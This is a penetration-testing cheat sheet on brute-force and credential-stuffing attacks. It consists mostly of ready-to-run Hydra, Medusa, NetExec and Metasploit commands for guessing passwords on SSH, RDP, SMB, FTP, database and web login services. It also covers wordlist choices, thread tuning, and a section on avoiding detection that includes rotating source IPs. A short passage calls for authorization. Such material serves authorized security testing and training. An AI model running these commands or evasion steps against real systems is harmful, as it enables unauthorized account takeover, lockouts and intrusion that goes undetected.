# Brute Force Attacks

Test multiple passwords against user accounts to gain unauthorized access through credential guessing.
Brute forcing is noisier than spraying and can trigger account lockouts, so use carefully with proper delays.

## Quick Reference

```bash
# Hydra SSH brute force
hydra -l admin -P rockyou.txt ssh://10.10.10.10

# Medusa RDP brute force
medusa -h 10.10.10.10 -u administrator -P passwords.txt -M rdp

# NetExec SMB brute force
nxc smb 10.10.10.10 -u admin -p passwords.txt
```

## Hydra

```bash
# SSH brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10

# SSH with custom port
hydra -l admin -P passwords.txt -s 2222 ssh://10.10.10.10

# RDP brute force
hydra -l administrator -P passwords.txt rdp://10.10.10.10

# SMB brute force
hydra -l admin -P passwords.txt smb://10.10.10.10

# FTP brute force
hydra -l ftpuser -P passwords.txt ftp://10.10.10.10

# MySQL brute force
hydra -l root -P passwords.txt mysql://10.10.10.10

# PostgreSQL brute force
hydra -l postgres -P passwords.txt postgres://10.10.10.10

# HTTP Basic Auth
hydra -l admin -P passwords.txt http-get://10.10.10.10/admin

# HTTP POST form
hydra -l admin -P passwords.txt 10.10.10.10 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials"

# HTTP POST with success condition
hydra -l admin -P passwords.txt 10.10.10.10 http-post-form "/login:username=^USER^&password=^PASS^:S=302"

# HTTP POST with success text
hydra -l admin -P passwords.txt 10.10.10.10 http-post-form "/login:username=^USER^&password=^PASS^:S=Dashboard"

# Multiple targets from file
hydra -l root -p toor -M targets.txt ssh

# Verbose output
hydra -l admin -P passwords.txt -V ssh://10.10.10.10

# Limit parallel tasks
hydra -l admin -P passwords.txt -t 4 ssh://10.10.10.10
```

## Medusa

```bash
# SSH brute force
medusa -h 10.10.10.10 -u root -P passwords.txt -M ssh

# SSH with parallel tasks
medusa -h 10.10.10.10 -u sshuser -P passwords.txt -M ssh -t 3

# SSH with custom port
medusa -h 10.10.10.10 -n 2222 -u admin -P passwords.txt -M ssh

# RDP brute force
medusa -h 10.10.10.10 -u administrator -P passwords.txt -M rdp

# SMB brute force
medusa -h 10.10.10.10 -u admin -P passwords.txt -M smbnt

# FTP brute force
medusa -h 10.10.10.10 -u ftpuser -P passwords.txt -M ftp

# MySQL brute force
medusa -h 10.10.10.10 -u root -P passwords.txt -M mysql

# PostgreSQL brute force
medusa -h 10.10.10.10 -u postgres -P passwords.txt -M postgres

# Telnet brute force
medusa -h 10.10.10.10 -u admin -P passwords.txt -M telnet

# VNC brute force
medusa -h 10.10.10.10 -P passwords.txt -M vnc

# Multiple targets
medusa -H targets.txt -u admin -P passwords.txt -M ssh

# Check for empty passwords
medusa -h 10.10.10.10 -U users.txt -P passwords.txt -M ssh -e n

# Check for passwords matching username
medusa -h 10.10.10.10 -U users.txt -P passwords.txt -M ssh -e s

# Both empty and username checks
medusa -h 10.10.10.10 -U users.txt -P passwords.txt -M ssh -e ns
```

## NetExec (CrackMapExec)

```bash
# SMB brute force
nxc smb 10.10.10.10 -u admin -p passwords.txt

# SMB with domain
nxc smb 10.10.10.10 -u admin -p passwords.txt -d domain.local

# WinRM brute force
nxc winrm 10.10.10.10 -u administrator -p passwords.txt

# RDP brute force
nxc rdp 10.10.10.10 -u admin -p passwords.txt

# MSSQL brute force
nxc mssql 10.10.10.10 -u sa -p passwords.txt

# LDAP brute force
nxc ldap 10.10.10.10 -u admin -p passwords.txt

# Local authentication
nxc smb 10.10.10.10 -u admin -p passwords.txt --local-auth

# Continue on success
nxc smb 10.10.10.10 -u admin -p passwords.txt --continue-on-success
```

## Metasploit

```bash
# SMB brute force
use auxiliary/scanner/smb/smb_login
set RHOSTS 10.10.10.10
set USER_FILE users.txt
set PASS_FILE passwords.txt
set SMBDomain domain.local
run

# SSH brute force
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 10.10.10.10
set USERNAME admin
set PASS_FILE passwords.txt
run

# WinRM brute force
use auxiliary/scanner/winrm/winrm_login
set RHOSTS 10.10.10.10
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

# MySQL brute force
use auxiliary/scanner/mysql/mysql_login
set RHOSTS 10.10.10.10
set USERNAME root
set PASS_FILE passwords.txt
run

# PostgreSQL brute force
use auxiliary/scanner/postgres/postgres_login
set RHOSTS 10.10.10.10
set USERNAME postgres
set PASS_FILE passwords.txt
run

# FTP brute force
use auxiliary/scanner/ftp/ftp_login
set RHOSTS 10.10.10.10
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

## Credential Stuffing

```bash
# Hydra with user:pass list
hydra -C user_pass.txt ssh://10.10.10.10

# Format: username:password (one per line)
# admin:Password123!
# user:Welcome1!

# NetExec credential stuffing (no brute force)
nxc smb 10.10.10.10 -u users.txt -p passwords.txt --no-bruteforce
```

## Advanced Hydra Techniques

```bash
# Generate passwords on the fly (6-8 chars, alphanumeric)
hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 10.10.10.10 rdp

# Resume interrupted session
hydra -l admin -P passwords.txt -R ssh://10.10.10.10

# Save output to file
hydra -l admin -P passwords.txt -o results.txt ssh://10.10.10.10

# Use proxy
hydra -l admin -P passwords.txt -e nsr -o results.txt -t 1 -w 10 -f ssh://10.10.10.10
```

## Common Workflow

```bash
# Step 1: Identify service and port
nmap -sV -p- 10.10.10.10

# Step 2: Select appropriate tool and wordlist
# For SSH: hydra or medusa
# For RDP: hydra or medusa
# For SMB: NetExec or Metasploit

# Step 3: Start with small wordlist
hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt ssh://10.10.10.10

# Step 4: If unsuccessful, use larger wordlist
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10

# Step 5: Monitor for lockouts
# Check account status periodically
# Adjust timing if needed
```

## Notes

**Brute Force vs Password Spraying:**

- **Brute Force**: Many passwords, one user
  - High risk of account lockout
  - Very noisy and easily detected
  - Faster if no lockout policy

- **Password Spraying**: One password, many users
  - Respects lockout policies
  - Less noisy
  - Slower but safer

**Account Lockout Risks:**

Brute forcing can trigger account lockouts:
- Typical threshold: 3-5 failed attempts
- Lockout duration: 30 minutes to permanent
- Can cause denial of service

Always check lockout policy first:
```bash
nxc smb 10.10.10.10 -u username -p password --pass-pol
```

**Tool Selection:**

- **Hydra**: 
  - Fast and versatile
  - Supports many protocols
  - Good for quick attacks
  - Can be unstable with some services

- **Medusa**:
  - More stable than Hydra
  - Better error handling
  - Modular design
  - Fewer protocols supported

- **NetExec**:
  - Best for Windows environments
  - Built-in SMB, WinRM, MSSQL support
  - Shows admin access clearly
  - Active development

- **Metasploit**:
  - Integrated with exploitation framework
  - Good for complex scenarios
  - Slower than standalone tools
  - Better logging and reporting

**HTTP Form Brute Forcing:**

When targeting web login forms:

1. Inspect the form to identify field names
2. Determine success/failure indicators
3. Use appropriate condition string

Failure condition (F=):
```bash
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"
```

Success condition (S=):
```bash
# HTTP redirect
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=302"

# Success text
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=Dashboard"
```

**Performance Tuning:**

Adjust parallel tasks based on target:
```bash
# Hydra: -t flag (default 16)
hydra -t 4 -l admin -P passwords.txt ssh://10.10.10.10

# Medusa: -t flag (default 4)
medusa -t 8 -h 10.10.10.10 -u admin -P passwords.txt -M ssh
```

Lower values:
- Slower but stealthier
- Less likely to trigger IDS/IPS
- Better for unstable services

Higher values:
- Faster attacks
- More network traffic
- Higher detection risk

**Wordlist Recommendations:**

Small lists (quick tests):
- `/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt`
- `/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt`
- `/usr/share/seclists/Passwords/darkweb2017-top100.txt`

Medium lists:
- `/usr/share/seclists/Passwords/darkweb2017-top10000.txt`
- `/usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt`

Large lists:
- `/usr/share/wordlists/rockyou.txt` (14M passwords)
- `/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt`

**Detection Avoidance:**

- Use realistic delays between attempts
- Limit parallel connections
- Rotate source IPs if possible
- Brute force during business hours
- Monitor for defensive responses
- Stop if lockouts detected

**Success Indicators:**

Hydra:
```
[22][ssh] host: 10.10.10.10 login: admin password: Password123!
```

Medusa:
```
ACCOUNT FOUND: [ssh] Host: 10.10.10.10 User: admin Password: Password123!
```

NetExec:
```
SMB  10.10.10.10  445  DC01  [+] domain.local\admin:Password123! (Pwn3d!)
```

**Legal and Ethical Considerations:**

- Only brute force with explicit authorization
- Respect account lockout policies
- Avoid denial of service conditions
- Document all attempts
- Follow rules of engagement
- Stop if causing system instability

**Common Pitfalls:**

- Not checking for account lockouts
- Using too many parallel threads
- Not monitoring target system health
- Forgetting to check for default credentials first
- Using wrong protocol or port
- Not handling special characters in passwords
- Ignoring rate limiting

**Post-Success Actions:**

Once credentials found:
1. Verify access immediately
2. Document credentials securely
3. Check privilege level
4. Test on other systems (password reuse)
5. Continue enumeration with valid credentials
